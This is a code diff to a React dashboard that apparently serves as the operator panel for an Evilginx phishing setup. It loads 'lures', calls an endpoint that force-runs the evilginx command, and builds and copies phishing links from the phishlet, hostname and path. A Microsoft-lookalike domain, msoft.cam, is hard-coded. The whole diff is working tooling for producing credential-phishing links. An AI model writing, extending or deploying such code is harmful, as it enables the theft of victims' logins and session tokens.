@@ -400,114 +400,111 @@ export default function Dashboard() {
   useEffect(() => {
     console.log("Dashboard component mounted - immediate link regeneration");
 
-    // Force immediate refresh of the link by directly executing the evilginx command
-    const forceEvilginxCommand = async () => {
-      // Get saved lure ID from localStorage
-      const savedLureId = localStorage.getItem("selectedLureId");
+    const loadDefaultOrSavedLink = async () => {
+      setLinkLoading(true);
 
-      if (savedLureId) {
-        console.log(
-          "Force executing evilginx command for lureId:",
-          savedLureId
-        );
-        setLinkLoading(true);
+      try {
+        // Always fetch the available lures first
+        const luresResponse = await fetch("/api/lures");
 
-        try {
-          // Force a direct call to the lures endpoint to get the index
-          const luresResponse = await fetch("/api/lures");
+        if (luresResponse.ok) {
+          const luresData = await luresResponse.json();
+          const availableLures = luresData.lures || [];
 
-          if (luresResponse.ok) {
-            const luresData = await luresResponse.json();
-            const availableLures = luresData.lures || [];
+          // Update lures first
+          setLures(availableLures);
 
-            // Update lures first
-            setLures(availableLures);
+          if (availableLures.length === 0) {
+            console.log("No lures available");
+            setLinkLoading(false);
+            return;
+          }
 
-            // Find the index of the saved lure
-            const lureIndex = availableLures.findIndex(
+          // Check if we have a saved lure ID
+          const savedLureId = localStorage.getItem("selectedLureId");
+          let lureIndex = 0; // Default to first lure (index 0)
+
+          if (savedLureId) {
+            // Try to find the saved lure
+            const savedLureIndex = availableLures.findIndex(
               (lure) => lure.id === savedLureId
             );
 
-            if (lureIndex >= 0) {
-              console.log(
-                "Found lure at index:",
-                lureIndex,
-                "- DIRECTLY calling FORCE evilginx command"
-              );
-
-              // Use our new API endpoint that forces the command to run
-              try {
-                console.log("Making direct API call to FORCE evilginx command");
-
-                // Add a random timestamp to prevent any possible caching
-                const timestamp = Date.now();
-                const commandResponse = await fetch(
-                  `/api/force-lure-command?lureIndex=${lureIndex}&t=${timestamp}`
-                );
-
-                console.log("API status:", commandResponse.status);
-
-                if (commandResponse.ok) {
-                  const commandData = await commandResponse.json();
-                  console.log(
-                    "Force evilginx command executed successfully:",
-                    commandData
-                  );
-
-                  // Set the link from the command output
-                  if (
-                    commandData.url &&
-                    commandData.url !== "https://msoft.cam/wYyGBBeI"
-                  ) {
-                    console.log(
-                      "Got valid URL from force command:",
-                      commandData.url
-                    );
-                    setFullLink(commandData.url);
-
-                    // Set selected lure too
-                    const selectedLure = availableLures[lureIndex];
-                    setSelectedLure(selectedLure);
-                    setLinkLoading(false);
-                    return;
-                  } else {
-                    console.log("Invalid URL from force command:", commandData);
-                  }
-                } else {
-                  const errorData = await commandResponse.text();
-                  console.error(
-                    "Force command execution failed:",
-                    commandResponse.status,
-                    errorData
-                  );
-                }
-              } catch (cmdError) {
-                console.error(
-                  "Error executing force evilginx command:",
-                  cmdError
-                );
-              }
-
-              // Fall back to handleLureChange if force command failed
-              console.log(
-                "Force command failed, falling back to handleLureChange"
-              );
-              handleLureChange(lureIndex.toString());
-              return;
+            if (savedLureIndex >= 0) {
+              console.log("Found saved lure at index:", savedLureIndex);
+              lureIndex = savedLureIndex;
             } else {
-              console.log("Could not find lure with ID:", savedLureId);
+              console.log("Saved lure not found, using first lure (index 0)");
+              // Save the first lure ID to localStorage
+              localStorage.setItem("selectedLureId", availableLures[0].id);
             }
+          } else {
+            console.log("No saved lure, using first lure (index 0)");
+            // Save the first lure ID to localStorage
+            localStorage.setItem("selectedLureId", availableLures[0].id);
           }
-        } catch (error) {
-          console.error("Error in force evilginx command:", error);
-        } finally {
-          setLinkLoading(false);
+
+          // Always force execute the evilginx command to get the URL
+          console.log("Getting link for lure index:", lureIndex);
+
+          try {
+            // Use our force-lure-command API to ensure it runs
+            const timestamp = Date.now();
+            const commandResponse = await fetch(
+              `/api/force-lure-command?lureIndex=${lureIndex}&t=${timestamp}`
+            );
+
+            if (commandResponse.ok) {
+              const commandData = await commandResponse.json();
+              console.log("Command executed successfully:", commandData);
+
+              if (
+                commandData.url &&
+                commandData.url !== "https://msoft.cam/wYyGBBeI"
+              ) {
+                console.log("Got valid URL:", commandData.url);
+                setFullLink(commandData.url);
+                setSelectedLure(availableLures[lureIndex]);
+              } else {
+                console.log("Invalid URL from command, using fallback");
+                // Use fallback URL construction
+                const selectedLure = availableLures[lureIndex];
+                const fallbackUrl = `${selectedLure.phishlet}.${
+                  selectedLure.hostname || window.location.hostname
+                }${selectedLure.path}`;
+                setFullLink(fallbackUrl);
+                setSelectedLure(selectedLure);
+              }
+            } else {
+              console.error("Command execution failed, using fallback");
+              // Use fallback URL construction
+              const selectedLure = availableLures[lureIndex];
+              const fallbackUrl = `${selectedLure.phishlet}.${
+                selectedLure.hostname || window.location.hostname
+              }${selectedLure.path}`;
+              setFullLink(fallbackUrl);
+              setSelectedLure(selectedLure);
+            }
+          } catch (error) {
+            console.error("Error executing command:", error);
+            // Still set a fallback URL
+            const selectedLure = availableLures[lureIndex];
+            const fallbackUrl = `${selectedLure.phishlet}.${
+              selectedLure.hostname || window.location.hostname
+            }${selectedLure.path}`;
+            setFullLink(fallbackUrl);
+            setSelectedLure(selectedLure);
+          }
         }
+      } catch (error) {
+        console.error("Error loading lures:", error);
+      } finally {
+        setLinkLoading(false);
       }
     };
 
-    // Execute immediately to ensure the command runs right away
-    forceEvilginxCommand();
+    // Execute immediately to load a link right away
+    loadDefaultOrSavedLink();
   }, []); // Empty dependency array means this runs once on mount
 
   // Modify the original useEffect to better handle lure selection
@@ -1037,18 +1034,23 @@ export default function Dashboard() {
                         selectedLure.hostname || window.location.hostname
                       }${selectedLure.path}`
                     )
+                  ) : linkLoading ? (
+                    "Loading link..."
                   ) : (
-                    "No link selected"
+                    "Loading first available link..."
                   )}
                 </span>
-                {selectedLure && !linkLoading && (
+                {(selectedLure || fullLink) && !linkLoading && (
                   <button
                     onClick={() =>
                       copyToClipboard(
                         fullLink ||
-                          `${selectedLure.phishlet}.${
-                            selectedLure.hostname || window.location.hostname
-                          }${selectedLure.path}`
+                          (selectedLure
+                            ? `${selectedLure.phishlet}.${
+                                selectedLure.hostname ||
+                                window.location.hostname
+                              }${selectedLure.path}`
+                            : "https://link-not-available")
                       )
                     }
                     data-allow-context-menu="true"
